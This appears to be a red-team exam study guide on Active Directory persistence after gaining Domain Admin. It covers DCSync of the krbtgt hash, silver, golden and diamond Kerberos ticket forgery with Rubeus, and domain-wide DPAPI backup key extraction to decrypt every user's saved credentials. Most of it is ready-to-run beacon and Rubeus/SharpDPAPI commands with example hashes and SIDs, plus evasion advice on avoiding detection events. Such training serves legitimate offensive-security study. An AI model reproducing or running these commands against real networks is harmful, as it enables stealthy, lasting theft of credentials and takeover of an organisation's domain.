# C18 - Domain Dominance

> **Phase context:** Domain Dominance begins after you have obtained Domain Admin (or equivalent) privileges. The goal shifts from *gaining* access to *ensuring you keep it* — extracting secrets that let you re-authenticate as any user, to any service, indefinitely, even if your initial foothold is cleaned up.

> **No dedicated lab for this topic.** In the exam, these techniques apply once you've compromised a DA account (via Kerberoasting, DCSync from a compromised DC, etc.). In a multi-domain/forest environment, each domain has its own `krbtgt` — you need to DCSync per domain. Silver tickets are machine-specific. DPAPI backup keys are per-domain.

**Techniques covered:**
- [DCSync](#dcsync) — pull password hashes directly from a DC using replication protocol
- [Silver Tickets](#silver-tickets) — forge service tickets using a machine or service account secret
- [Golden Tickets](#golden-tickets) — forge TGTs using the `krbtgt` hash
- [Diamond Tickets](#diamond-tickets) — modify a legitimate TGT (stealthier than golden)
- [DPAPI Backup Key](#dpapi-backup-key) — extract domain-wide DPAPI key to decrypt all user credential blobs

**Prerequisites per technique:**

| Technique | Requires | Persists until |
|-----------|----------|----------------|
| DCSync | Domain Admin or DC computer account | — (one-time extraction) |
| Silver Ticket | Target machine/service AES256 or RC4 hash | Computer password change (~30 days) |
| Golden Ticket | `krbtgt` AES256 hash + domain SID | `krbtgt` password change (manual only) |
| Diamond Ticket | `krbtgt` AES256 hash + valid beacon TGT | `krbtgt` password change |
| DPAPI Backup Key | Domain Admin (to extract from DC) | Never changed automatically |

---

## DCSync

**What it is:** Mimics the Directory Replication Service (DRS) protocol that domain controllers use to sync data with each other. Instead of authenticating to LSASS on a DC, you ask the DC to *replicate* user data to you — including NTLM hashes and Kerberos keys. Pulls any account's hash without touching LSASS directly.

**Why `krbtgt` is the primary target:** The `krbtgt` account's hash is used to encrypt and sign all TGTs in the domain. Possessing it lets you forge valid TGTs for any user to any service. Unlike computer account secrets (rotated every 30 days), the `krbtgt` hash is **never automatically changed** — it persists indefinitely.

**Requires:** Domain Admin, Enterprise Admin, or a DC computer account.

### Extract krbtgt hash (most common — used for golden/diamond tickets)

```
beacon> dcsync contoso.com CONTOSO\krbtgt
```

> `OPSEC-CAUTION` — DRS replication requests originating from a non-DC IP address are anomalous and detectable.  
> Event ID **4662** is generated when Directory Service Access auditing is enabled. The identifying GUIDs logged:
> - `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` → DS-Replication-Get-Changes and DS-Replication-Get-Changes-All
> - `89e95b76-444d-4c62-991a-0facbeda640c` → DS-Replication-Get-Changes-In-Filtered-Set
>
> Defenders must identify replication requests from IPs that are *not* known DCs. Pull only the account you need — avoid bulk replication (`/all`) which is far more anomalous.

### Extract specific accounts

```
beacon> dcsync contoso.com CONTOSO\krbtgt          # for golden/diamond tickets
beacon> dcsync contoso.com CONTOSO\Administrator   # DA hash for PTH / lateral movement
beacon> dcsync contoso.com CONTOSO\<target-user>   # any user's hash on demand
```

### Get domain SID (needed for all ticket forgery)

```
beacon> powerpick Get-DomainSID
# also visible in DCSync output — look for "Object Security ID" field
```

### Multi-domain / forest note

> In a multi-domain forest, each child domain has its own `krbtgt`. If you have DA in `child.contoso.com`, DCSync *that domain's* `krbtgt` for tickets valid in that domain. Golden tickets from one domain are not valid in a different domain — they are bound to the domain SID and signed by that domain's `krbtgt`.

---

## Ticket Forgery

**What it is:** Using stolen secrets to create Kerberos tickets *offline* (without talking to a KDC) and injecting them into a logon session. The forged ticket is cryptographically valid — the target service or DC cannot distinguish it from a legitimately issued ticket, provided the signing key is correct.

---

### Silver Tickets

**What:** A forged Kerberos *service ticket* (TGS), signed with the target machine's or service account's secret. Unlike a golden ticket (which forges a TGT), a silver ticket forges the ticket for a *specific service on a specific machine*.

**Why useful:**
1. **Maintain local admin access after an exploit:** If you compromised a machine via exploit and dumped its computer account hash, you can forge a CIFS ticket that gives you persistent remote file access — even if the original exploit path is patched.
2. **Escalate via Kerberoasted service accounts:** If you crack/know the plaintext of a service account, you can forge a ticket *impersonating a sysadmin user* for that service, even if your actual credentials have no access.

**Downside:** Computer account secrets are automatically rotated by AD every **30 days** — silver tickets using a computer account hash expire when the hash is rotated.

#### Use Case 1 — CIFS access using computer account hash

Run on the attacker Windows machine (not in beacon):

```powershell
# Forge a silver ticket for CIFS on lon-db-1, impersonating Administrator
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver `
  /service:cifs/lon-db-1 `
  /aes256:bc6fd6e8519b52e09f60961beeee083a441c25908e30a6c29b124b516e06945f `
  /user:Administrator `
  /domain:CONTOSO.COM `
  /sid:S-1-5-21-3926355307-1661546229-813047887 `
  /nowrap
```

**Parameters:**
- `/service` — target service and host (format: `cifs/hostname` or `http/hostname` etc.)
- `/aes256` — AES256 hash of the **computer account** (lon-db-1$), obtained via DCSync or LSASS dump
- `/user` — username to impersonate in the forged ticket (does not need to exist — but use a valid DA account)
- `/domain` — FQDN of the domain
- `/sid` — domain SID (from `Get-DomainSID` or DCSync output)
- `/nowrap` — output ticket as single-line base64

> Rubeus defaults: user RID 500, group RIDs 520,512,513,519,518. Override with `/id:<RID>` and `/groups:<RIDs>`.

Inject and verify:

```
beacon> make_token CONTOSO\Administrator FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFb[...snip...]kYi0x
beacon> run klist
beacon> ls \\lon-db-1\c$
beacon> rev2self
```

> `make_token` creates a Type 9 logon session (password is never validated). `ptt` (Pass-The-Ticket) injects the forged ticket into that session's Kerberos cache. `klist` confirms the ticket is loaded. `rev2self` drops the token when done.

#### Use Case 2 — MSSQLSvc access via Kerberoasted/plaintext service account

When you have a service account's plaintext password (e.g. from Kerberoasting crack) but the account is not a SQL sysadmin, forge a ticket *as a user who is* sysadmin:

**Step 1 — Convert plaintext password to hash:**

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash `
  /user:mssql_svc `
  /domain:CONTOSO.COM `
  /password:Passw0rd!
```

> Outputs RC4 (NTLM) and AES128/AES256 hashes. Use AES256 where possible — RC4 is more heavily monitored.

**Step 2 — Forge the MSSQLSvc service ticket, impersonating a sysadmin:**

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver `
  /service:MSSQLSvc/lon-db-1.contoso.com:1433 `
  /rc4:FC525C9683E8FE067095BA2DDC971889 `
  /user:rsteel `
  /id:1108 `
  /groups:513,1106,1107,4602 `
  /domain:CONTOSO.COM `
  /sid:S-1-5-21-3926355307-1661546229-813047887 `
  /nowrap
```

> `/id` = rsteel's RID (obtain via `Get-DomainUser rsteel | select objectsid`).  
> `/groups` = rsteel's group RIDs: 513 = Domain Users, 1106 = Workstation Admins, 1107 = Server Admins, 4602 = Database Admins. Match these to what SQL Server expects — the PAC group memberships are what grant the sysadmin role.  
> Get group RIDs: `powerpick Get-DomainGroup | select name,objectsid`

Inject and use:

```
beacon> make_token CONTOSO\rsteel FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFVz[...snip...]50b3NvLmNvbToxNDMz
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:lon-db-1.contoso.com /m:info
```

#### OPSEC — Silver Tickets

> `OPSEC-CAUTION`  
> **PAC validation:** If PAC validation is enabled on the target computer, the silver ticket checksum (signed with the computer's key) will be validated against the KDC — and will fail because the KDC signs PACs with its own key, not the computer's. Mitigation: if you also have the `krbtgt` hash, you can sign the PAC with it too.  
>
> **Detection via event correlation:** In a legitimate exchange, a service ticket use (Event 4624 on the target machine) is preceded by a TGS-REQ logged as Event 4769 on a DC. Forged silver tickets produce a **4624 with no preceding 4769** — a strong IoC.  
>
> **Ticket anomalies:** The Kerberos realm in the ticket should be uppercase. Some older tools output lowercase — Rubeus converts to uppercase automatically.

---

### Golden Tickets

**What:** A forged TGT signed with the `krbtgt` account's secret (AES256 hash). When injected, Windows uses it to request legitimate service tickets from the KDC via standard TGS-REQ/TGS-REP — so service ticket issuance appears legitimate.

**Why more powerful than silver tickets:** A golden ticket gives you a valid TGT. From that TGT, Windows can request service tickets for *any service* to *any host* in the domain — not just one specific service like a silver ticket. Essentially grants full DA-equivalent access without needing an account password or hash beyond `krbtgt`.

**Persistence advantage:** The `krbtgt` hash is **never rotated automatically**. The only way to invalidate existing golden tickets is to rotate `krbtgt` twice (the current and previous version are both valid) — an operational disruption few organisations willingly perform.

### Forge and inject a golden ticket

```powershell
# Run on attacker Windows machine
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden `
  /aes256:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c `
  /user:Administrator `
  /domain:CONTOSO.COM `
  /sid:S-1-5-21-3926355307-1661546229-813047887 `
  /nowrap
```

**Parameters:**
- `/aes256` — AES256 hash of `krbtgt` account (from DCSync)
- `/user` — username to impersonate (use a real DA account name — fake names can be detected)
- `/domain` — FQDN of the current domain
- `/sid` — current domain SID

Inject and verify:

```
beacon> make_token CONTOSO\Administrator FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFg[...snip...]uQ09N
beacon> run klist
beacon> ls \\lon-dc-1\c$
beacon> rev2self
```

#### OPSEC — Golden Tickets

> `OPSEC-CAUTION`  
> **Missing AS-REQ (4768):** In a normal Kerberos flow, a user's TGT is obtained via AS-REQ (Event 4768). Forged golden tickets skip this — so defenders may spot TGS-REQs (4769) from a user with no preceding 4768 from the same host.  
>
> **Mimikatz 10-year lifetime:** Mimikatz sets forged ticket lifetimes to 10 years by default. Domain policy typically sets max ticket lifetime to 10 hours, renewable for 7 days. A ticket with a 10-year lifetime is an immediate IoC. **Rubeus does not have this problem** — use Rubeus for ticket forgery, not Mimikatz's `kerberos::golden`.  
>
> **Impersonated username:** Use a real domain user account name (e.g. Administrator). Forging tickets for fictional users leaves anomalous entries in Security logs.

---

### Diamond Tickets

**What:** A diamond ticket starts as a *legitimate* TGT requested from the KDC, then is decrypted using the `krbtgt` hash, modified internally (user, RID, groups), re-encrypted, and re-signed. The end result is functionally identical to a golden ticket but with much better stealth.

**Why stealthier than golden tickets:**
- The ticket's infrastructure fields (timestamps, domain policy lifetime, encryption metadata) are copied from a real KDC-issued ticket — no anomalous values.
- The AS-REQ (Event 4768) *does* exist for the original user, making event correlation harder to detect.
- Ticket lifetime matches domain policy exactly.

**Requires:** `krbtgt` AES256 hash + an active beacon (for the TGT delegation trick).

### Forge a diamond ticket

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond `
  /tgtdeleg `
  /krbkey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c `
  /ticketuser:Administrator `
  /ticketuserid:500 `
  /domain:CONTOSO.COM `
  /nowrap
```

**Parameters:**
- `/tgtdeleg` — uses the Kerberos unconstrained delegation trick to obtain a usable TGT for the *current beacon user* without needing credentials. Works in any beacon session.
- `/krbkey` — `krbtgt` AES256 hash (from DCSync)
- `/ticketuser` — the user to impersonate in the modified ticket
- `/ticketuserid` — the RID of the impersonated user (500 = built-in Administrator)
- `/domain` — current domain FQDN

> Rubeus outputs two tickets: the original (current user's TGT) and the modified diamond ticket. Use the second one.  
> Default groups: 520,512,513,519,518. Override with `/groups:<RIDs>`.

### Verify ticket contents before injecting

```powershell
# Describe original TGT (should show current user)
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe `
  /servicekey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c `
  /ticket:doIFm[...first-ticket-snip...]kNPTQ==

# Describe diamond ticket (should show Administrator)
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe `
  /servicekey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c `
  /ticket:doIF7[...second-ticket-snip...]kNPTQ==
```

> `FullName` field in the ticket will still reflect the original TGT user — a minor anomaly if inspected. This is expected behaviour and a known limitation.

Inject and use:

```
beacon> make_token CONTOSO\Administrator FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIF5[...diamond-snip...]5DT00=
beacon> run klist
beacon> ls \\lon-dc-1\c$
beacon> rev2self
```

#### OPSEC — Diamond Tickets

> `OPSEC-SAFE` relative to golden tickets.  
> Diamond tickets produce a genuine AS-REQ (4768) for the original user — the 4768 → 4769 event correlation that exposes golden tickets does not apply here.  
> Ticket lifetime and domain metadata match policy exactly.  
> **Prefer diamond tickets over golden tickets in the exam** unless you have no active beacon to perform the `/tgtdeleg` request.

---

### Ticket Forgery — Exam Decision Guide

```
Do you need to forge a ticket for a SPECIFIC service on a SPECIFIC host?
  └─ Yes → Silver Ticket (needs service/computer account hash)

Do you need unrestricted DA-equivalent access across the domain?
  └─ Yes, and you have an active beacon → Diamond Ticket (stealthier)
  └─ Yes, no beacon / need offline forgery → Golden Ticket (OPSEC-CAUTION)

Do you need to impersonate a sysadmin user on a SQL server you can't access directly?
  └─ Silver Ticket for MSSQLSvc (use Kerberoasted service account hash)
```

---

## DPAPI Backup Key

**What DPAPI is:** The Data Protection API (DPAPI) protects secrets stored in Windows Credential Manager, browser credentials, RDP saved credentials, and more. Secrets are encrypted with a per-user AES *masterkey*, which itself is encrypted using a key derived from the user's password.

**The backup key problem:** When a user changes their password, the password-derived encryption key changes — making the existing masterkey unreadable. To prevent data loss, Windows also stores a copy of the masterkey encrypted with a domain-wide *backup key* held in AD. Any DA can retrieve this backup key and use it to decrypt *any user's masterkey* in the domain.

**Why this matters for domain dominance:** The backup key is generated once when the domain is created and **never automatically changed** (there is no supported mechanism to change it). Extracting it gives you a permanent capability to decrypt all DPAPI-protected secrets for all domain users — useful for recovering credentials long after initial access is lost.

### Extract the domain DPAPI backup key

Requires a beacon running with DA privileges:

```
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey
```

> `OPSEC-CAUTION` — uses the BackupKey Remote Protocol to connect to a DC and retrieve the backup key. Logged as an LDAP/RPC request to the DC. Requires DA.  
> Output is a base64-encoded PVK blob — save this securely offline. This key does not expire.

### Decrypt credentials using the backup key

**Step 1 — Confirm your beacon identity:**

```
beacon> getuid
```

> Even if you are DA, you can only decrypt credentials for users whose credential files you can access. The backup key bypasses the password-derivation step, but you still need the encrypted credential/masterkey files.

**Step 2 — Enumerate available credential blobs (using current user's context):**

```
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials
```

> Without the backup key, SharpDPAPI can only decrypt credentials belonging to the current user (using the `/rpc` method to ask the user's own DPAPI service). For *other users* (e.g. pchilds' credentials from dyork's beacon), `/rpc` will fail — the backup key is required.

**Step 3 — Decrypt any user's credentials using the backup key:**

```
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /pvk:HvG1s[...backup-key-base64...]lXQns=
```

> `/pvk` is the base64 backup key output from step 1.  
> SharpDPAPI will locate and decrypt all credential blobs it can find in the current user's profile and any accessible paths. Output includes decrypted credentials (usernames, passwords, certificates).  
> `OPSEC-CAUTION` — file access to credential store locations is logged if file access auditing is enabled.

### What DPAPI protects (high-value targets)

| Credential type | Location |
|-----------------|----------|
| Windows Credential Manager | `%APPDATA%\Microsoft\Credentials\` |
| Browser saved passwords | Chrome/Edge: `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` |
| RDP saved credentials | DPAPI-protected in Credential Manager |
| WiFi PSKs | `C:\ProgramData\Microsoft\Wlansvc\Profiles\` |
| Certificate private keys | `%APPDATA%\Microsoft\Crypto\RSA\` |

### Multi-user credential decryption (exam scenario)

```
# From a DA beacon, enumerate a different user's credential files
beacon> ls C:\Users\<target-user>\AppData\Roaming\Microsoft\Credentials\
beacon> download C:\Users\<target-user>\AppData\Roaming\Microsoft\Credentials\<blob>

# On attacker machine — decrypt using backup key
SharpDPAPI.exe credentials /pvk:<backup-key-base64>
```

---

## Exam Quick Reference

### Pre-requisite data collection (do this immediately after reaching DA)

```
# 1. Get domain SID
beacon> powerpick Get-DomainSID

# 2. DCSync krbtgt (for golden/diamond tickets)
beacon> dcsync contoso.com CONTOSO\krbtgt

# 3. DCSync Administrator (backup access)
beacon> dcsync contoso.com CONTOSO\Administrator

# 4. Pull DPAPI backup key
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey

# 5. Note: save krbtgt AES256, domain SID, and backup key PVK offline
```

### Key material cheat card

| Need | Tool | Source |
|------|------|--------|
| Domain SID | `Get-DomainSID` or DCSync output | AD |
| krbtgt AES256 | `dcsync CONTOSO\krbtgt` | DC |
| Computer account AES256 | `dcsync CONTOSO\<machine>$` or LSASS dump | Target host |
| Service account hash | Rubeus `hash` from plaintext, or Kerberoasting | varies |
| User RID | `Get-DomainUser <user> \| select objectsid` | AD |
| Group RIDs | `Get-DomainGroup \| select name,objectsid` | AD |

### OPSEC tiers for this phase

| Technique | Tier | Primary detection |
|-----------|------|-------------------|
| DCSync (targeted) | CAUTION | Event 4662 from non-DC IP |
| Silver ticket (computer acct) | CAUTION | 4624 without prior 4769; PAC validation failure |
| Silver ticket (service acct) | CAUTION | Same as above |
| Golden ticket | CAUTION | Missing 4768; anomalous ticket lifetime if using Mimikatz |
| Diamond ticket | SAFE (relative) | FullName field mismatch in ticket (minor) |
| DPAPI backup key extraction | CAUTION | RPC call to DC; file access auditing |

### Inject ticket — standard pattern (same for silver/golden/diamond)

```
beacon> make_token CONTOSO\<impersonated-user> FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64-ticket>
beacon> run klist
beacon> <access the target resource>
beacon> rev2self
```

> Always `rev2self` after completing the task — lingering token impersonation in a beacon session is unnecessary noise.

### Rubeus commands summary

```powershell
# Silver — computer account (CIFS)
Rubeus.exe silver /service:cifs/<host> /aes256:<hash> /user:Administrator /domain:<FQDN> /sid:<SID> /nowrap

# Silver — service account (MSSQLSvc)
Rubeus.exe silver /service:MSSQLSvc/<host.fqdn>:<port> /rc4:<hash> /user:<sysadmin-user> /id:<RID> /groups:<RIDs> /domain:<FQDN> /sid:<SID> /nowrap

# Golden
Rubeus.exe golden /aes256:<krbtgt-hash> /user:Administrator /domain:<FQDN> /sid:<SID> /nowrap

# Diamond (preferred — run in beacon)
execute-assembly Rubeus.exe diamond /tgtdeleg /krbkey:<krbtgt-aes256> /ticketuser:Administrator /ticketuserid:500 /domain:<FQDN> /nowrap

# Pass-the-ticket (inject)
execute-assembly Rubeus.exe ptt /ticket:<base64>

# Hash conversion (plaintext → RC4/AES)
Rubeus.exe hash /user:<user> /domain:<FQDN> /password:<plaintext>

# Describe ticket contents
Rubeus.exe describe /servicekey:<krbtgt-aes256> /ticket:<base64>
```

### SharpDPAPI commands summary

```
# Extract domain backup key (DA required)
execute-assembly SharpDPAPI.exe backupkey

# Decrypt current user's credentials
execute-assembly SharpDPAPI.exe credentials

# Decrypt any user's credentials using backup key
execute-assembly SharpDPAPI.exe credentials /pvk:<base64-backup-key>
```
